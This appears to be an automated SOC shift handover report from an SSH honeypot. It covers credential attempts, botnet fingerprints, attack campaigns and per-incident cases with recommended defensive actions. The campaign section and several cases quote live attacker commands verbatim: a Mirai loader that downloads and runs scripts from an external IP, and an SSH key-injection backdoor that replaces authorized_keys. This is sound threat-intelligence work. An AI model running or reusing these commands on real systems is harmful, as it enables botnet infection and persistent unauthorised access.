# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-08 |
| **Generated At** | 2026-10-08T18:10:59Z |
| **Shift Time** | 18:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **390** |
| Confirmed Threats | **339** |
| False Positives Filtered | **51** (13.1%) |
| Unique Attacker IPs | **226** |
| Countries of Origin | **43** |
| High Severity Cases | **199** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **191** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 10 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **14268** |
| Unique Credential Pairs | **13760** |
| Unique Usernames | **941** |
| Unique Passwords | **13098** |
| Successful Auth Pairs | **13991** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12492 |
| `ubuntu` | 135 |
| `345gs5662d34` | 99 |
| `admin` | 57 |
| `user` | 46 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 126 |
| `345gs5662d34` | 99 |
| `3245gs5662d34` | 97 |
| `123` | 33 |
| `support` | 27 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 99 |
| `root` | `3245gs5662d34` | 41 |
| `support` | `support` | 26 |
| `root` | `123456` | 20 |
| `admin` | `admin` | 15 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test1234` | `77.239.124.143` | 2026-10-08T02:55:08 |
| `root` | `159357258` | `77.239.124.143` | 2026-10-08T02:55:14 |
| `runner` | `runner` | `77.239.124.143` | 2026-10-08T02:55:20 |
| `test` | `1` | `77.239.124.143` | 2026-10-08T02:55:26 |
| `gk` | `gk123` | `77.239.124.143` | 2026-10-08T02:55:32 |
| `deploy` | `toor` | `77.239.124.143` | 2026-10-08T02:55:37 |
| `root` | `1234!@` | `77.239.124.143` | 2026-10-08T02:55:44 |
| `root` | `123@@@` | `77.239.124.143` | 2026-10-08T02:55:50 |
| `tom` | `tom` | `77.239.124.143` | 2026-10-08T02:55:55 |
| `webadmin` | `123456` | `77.239.124.143` | 2026-10-08T02:56:01 |
| `user1` | `user123` | `77.239.124.143` | 2026-10-08T02:56:06 |
| `hduser` | `hduser` | `77.239.124.143` | 2026-10-08T02:56:11 |
| `root` | `CatCult2025!` | `77.239.124.143` | 2026-10-08T02:56:17 |
| `root` | `123456qq@` | `77.239.124.143` | 2026-10-08T02:56:23 |
| `admin1` | `123456` | `77.239.124.143` | 2026-10-08T02:56:29 |
| `test` | `test@12345` | `77.239.124.143` | 2026-10-08T02:56:34 |
| `admin1` | `modzmodz` | `77.239.124.143` | 2026-10-08T02:56:40 |
| `admin` | `admin123` | `77.239.124.143` | 2026-10-08T02:56:45 |
| `root` | `P@ssw0rd!` | `77.239.124.143` | 2026-10-08T02:56:50 |
| `root` | `rayman` | `77.239.124.143` | 2026-10-08T02:56:56 |
_… 13971 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **390** |
| Sessions with Fingerprint | **27** |
| Unique HASSH Fingerprints | **27** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 159 |
| Go SSH scanner | 47 |
| Paramiko (Python) | 20 |
| Unknown | 7 |
| PuTTY | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 126 | 64 |
| `a2de0f306611...` | Mirai/variant | 17 | 2 |
| `03a80b21afa8...` | Modern SSH client | 17 | 9 |
| `0a07365cc01f...` | Generic scanner | 15 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 8 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 126 | 64 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 17 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 17 | 9 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 15 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 12 | 12 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 8 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 6 | 3 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **18** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 40 | 4 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 65 | 64 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1070, T1140, T1059.004` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.234`, `92.118.39.50`, `2.57.122.74`, `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `111.238.174.6`, `85.185.201.10`, `58.221.60.25`, `124.45.31.57`, `47.237.107.46`, `114.103.244.110`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/handshakebins.sh;curl -o handshakebins.sh http://213.232.114.14/handshakebins.sh;busybox wget http://213.232.114.14/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114.14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114.14 ftp1.sh ftp1.sh;sh ftp1.sh;rm -rf handshakebins.sh tftp1.sh
```
Source IPs: `94.154.43.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **226** |
| Unique ASNs | **100** |
| High-Risk ASNs | **72** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 59 | HIGH |
| `AS396982` | Google LLC | 14 | HIGH |
| `AS4766` | Korea Telecom | 9 | HIGH |
| `AS8075` | Microsoft Corporation | 8 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 7 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (195)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-44d85e8ef6a1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]143` |
| **First Seen** | 2026-10-08 02:55 |
| **Last Seen** | 2026-10-08 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 02:55:07` | `cowrie.session.connect` |
| `2026-10-08 02:55:07` | `cowrie.client.version` |
| `2026-10-08 02:55:07` | `cowrie.client.kex` |
| `2026-10-08 02:55:08` | `cowrie.login.success` |
| `2026-10-08 02:55:08` | `cowrie.session.params` |
| `2026-10-08 02:55:08` | `cowrie.command.input` |
| `2026-10-08 02:55:08` | `cowrie.log.closed` |
| `2026-10-08 02:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]143` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c6a78359d7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]74` |
| **First Seen** | 2026-10-08 02:58 |
| **Last Seen** | 2026-10-08 03:00 |
| **Session Duration** | 120s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 02:58:08` | `cowrie.session.connect` |
| `2026-10-08 02:58:09` | `cowrie.client.version` |
| `2026-10-08 02:58:09` | `cowrie.client.kex` |
| `2026-10-08 02:58:14` | `cowrie.login.success` |
| `2026-10-08 02:58:17` | `cowrie.session.params` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| `2026-10-08 02:58:17` | `cowrie.command.success` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| `2026-10-08 02:58:17` | `cowrie.command.input` |
| … | _7 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]74` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcad54e9ad55

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-08 03:12 |
| **Last Seen** | 2026-10-08 03:17 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 03:12:05` | `cowrie.session.connect` |
| `2026-10-08 03:12:05` | `cowrie.client.version` |
| `2026-10-08 03:12:05` | `cowrie.client.kex` |
| `2026-10-08 03:12:06` | `cowrie.login.success` |
| `2026-10-08 03:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a257469282cb

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-08 03:12 |
| **Last Seen** | 2026-10-08 03:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 03:12:42` | `cowrie.session.connect` |
| `2026-10-08 03:12:42` | `cowrie.client.version` |
| `2026-10-08 03:12:42` | `cowrie.client.kex` |
| `2026-10-08 03:12:45` | `cowrie.login.success` |
| `2026-10-08 03:12:45` | `cowrie.session.params` |
| `2026-10-08 03:12:45` | `cowrie.command.input` |
| `2026-10-08 03:12:46` | `cowrie.log.closed` |
| `2026-10-08 03:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65367554eca5

| Field | Detail |
|---|---|
| **Source IP** | `123.117.152[.]61` |
| **First Seen** | 2026-10-08 03:24 |
| **Last Seen** | 2026-10-08 03:30 |
| **Session Duration** | 339s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 03:24:27` | `cowrie.session.connect` |
| `2026-10-08 03:25:16` | `cowrie.client.version` |
| `2026-10-08 03:25:16` | `cowrie.client.kex` |
| `2026-10-08 03:25:17` | `cowrie.login.success` |
| `2026-10-08 03:30:07` | `cowrie.session.file_upload` |
| `2026-10-08 03:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.117.152[.]61` to AbuseIPDB if not already reported
- [ ] Block `123.117.152[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a8284cf066

| Field | Detail |
|---|---|
| **Source IP** | `51.195.149[.]120` |
| **First Seen** | 2026-10-08 03:26 |
| **Last Seen** | 2026-10-08 03:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 03:26:56` | `cowrie.session.connect` |
| `2026-10-08 03:26:56` | `cowrie.client.version` |
| `2026-10-08 03:26:56` | `cowrie.client.kex` |
| `2026-10-08 03:26:56` | `cowrie.login.success` |
| `2026-10-08 03:26:57` | `cowrie.session.params` |
| `2026-10-08 03:26:57` | `cowrie.command.input` |
| `2026-10-08 03:26:57` | `cowrie.command.failed` |
| `2026-10-08 03:26:57` | `cowrie.log.closed` |
| `2026-10-08 03:26:58` | `cowrie.session.params` |
| `2026-10-08 03:26:58` | `cowrie.command.input` |
| `2026-10-08 03:26:58` | `cowrie.session.file_download` |
| `2026-10-08 03:26:58` | `cowrie.log.closed` |
| `2026-10-08 03:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.195.149[.]120` to AbuseIPDB if not already reported
- [ ] Block `51.195.149[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a233bc161c

| Field | Detail |
|---|---|
| **Source IP** | `51.195.149[.]120` |
| **First Seen** | 2026-10-08 03:26 |
| **Last Seen** | 2026-10-08 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 03:26:58` | `cowrie.session.connect` |
| `2026-10-08 03:26:58` | `cowrie.client.version` |
| `2026-10-08 03:26:58` | `cowrie.client.kex` |
| `2026-10-08 03:26:59` | `cowrie.login.success` |
| `2026-10-08 03:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.195.149[.]120` to AbuseIPDB if not already reported
- [ ] Block `51.195.149[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47f6915dc216

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-08 03:39 |
| **Last Seen** | 2026-10-08 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 03:39:16` | `cowrie.session.connect` |
| `2026-10-08 03:39:16` | `cowrie.client.version` |
| `2026-10-08 03:39:16` | `cowrie.client.kex` |
| `2026-10-08 03:39:16` | `cowrie.login.success` |
| `2026-10-08 03:39:16` | `cowrie.direct-tcpip.request` |
| `2026-10-08 03:39:17` | `cowrie.direct-tcpip.data` |
| `2026-10-08 03:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9816eec0162

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]104` |
| **First Seen** | 2026-10-08 03:43 |
| **Last Seen** | 2026-10-08 03:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 03:43:28` | `cowrie.session.connect` |
| `2026-10-08 03:43:28` | `cowrie.client.version` |
| `2026-10-08 03:43:28` | `cowrie.client.kex` |
| `2026-10-08 03:43:29` | `cowrie.login.success` |
| `2026-10-08 03:43:30` | `cowrie.session.params` |
| `2026-10-08 03:43:30` | `cowrie.command.input` |
| `2026-10-08 03:43:32` | `cowrie.log.closed` |
| `2026-10-08 03:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]104` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508e24e02231

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]143` |
| **First Seen** | 2026-10-08 04:00 |
| **Last Seen** | 2026-10-08 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:00:02` | `cowrie.session.connect` |
| `2026-10-08 04:00:02` | `cowrie.client.version` |
| `2026-10-08 04:00:02` | `cowrie.client.kex` |
| `2026-10-08 04:00:03` | `cowrie.login.success` |
| `2026-10-08 04:00:03` | `cowrie.session.params` |
| `2026-10-08 04:00:03` | `cowrie.command.input` |
| `2026-10-08 04:00:03` | `cowrie.log.closed` |
| `2026-10-08 04:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]143` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2bc8249cfb5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]104` |
| **First Seen** | 2026-10-08 04:00 |
| **Last Seen** | 2026-10-08 04:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:00:03` | `cowrie.session.connect` |
| `2026-10-08 04:00:03` | `cowrie.client.version` |
| `2026-10-08 04:00:03` | `cowrie.client.kex` |
| `2026-10-08 04:00:05` | `cowrie.login.success` |
| `2026-10-08 04:00:07` | `cowrie.session.params` |
| `2026-10-08 04:00:07` | `cowrie.command.input` |
| `2026-10-08 04:00:07` | `cowrie.log.closed` |
| `2026-10-08 04:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]104` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a7aa64e5d38

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-08 04:00 |
| **Last Seen** | 2026-10-08 04:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:00:12` | `cowrie.session.connect` |
| `2026-10-08 04:00:12` | `cowrie.client.version` |
| `2026-10-08 04:00:12` | `cowrie.client.kex` |
| `2026-10-08 04:00:12` | `cowrie.login.success` |
| `2026-10-08 04:00:13` | `cowrie.direct-tcpip.request` |
| `2026-10-08 04:00:13` | `cowrie.direct-tcpip.data` |
| `2026-10-08 04:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-380a5aa5048b

| Field | Detail |
|---|---|
| **Source IP** | `51.195.149[.]120` |
| **First Seen** | 2026-10-08 04:31 |
| **Last Seen** | 2026-10-08 04:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:31:57` | `cowrie.session.connect` |
| `2026-10-08 04:31:57` | `cowrie.client.version` |
| `2026-10-08 04:31:57` | `cowrie.client.kex` |
| `2026-10-08 04:31:57` | `cowrie.login.success` |
| `2026-10-08 04:31:58` | `cowrie.session.params` |
| `2026-10-08 04:31:58` | `cowrie.command.input` |
| `2026-10-08 04:31:58` | `cowrie.command.failed` |
| `2026-10-08 04:31:58` | `cowrie.log.closed` |
| `2026-10-08 04:31:59` | `cowrie.session.params` |
| `2026-10-08 04:31:59` | `cowrie.command.input` |
| `2026-10-08 04:31:59` | `cowrie.session.file_download` |
| `2026-10-08 04:31:59` | `cowrie.log.closed` |
| `2026-10-08 04:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.195.149[.]120` to AbuseIPDB if not already reported
- [ ] Block `51.195.149[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3648e56970dc

| Field | Detail |
|---|---|
| **Source IP** | `51.195.149[.]120` |
| **First Seen** | 2026-10-08 04:31 |
| **Last Seen** | 2026-10-08 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:31:59` | `cowrie.session.connect` |
| `2026-10-08 04:31:59` | `cowrie.client.version` |
| `2026-10-08 04:31:59` | `cowrie.client.kex` |
| `2026-10-08 04:31:59` | `cowrie.login.success` |
| `2026-10-08 04:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.195.149[.]120` to AbuseIPDB if not already reported
- [ ] Block `51.195.149[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88ca3c44907

| Field | Detail |
|---|---|
| **Source IP** | `212.3.155[.]8` |
| **First Seen** | 2026-10-08 04:34 |
| **Last Seen** | 2026-10-08 04:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
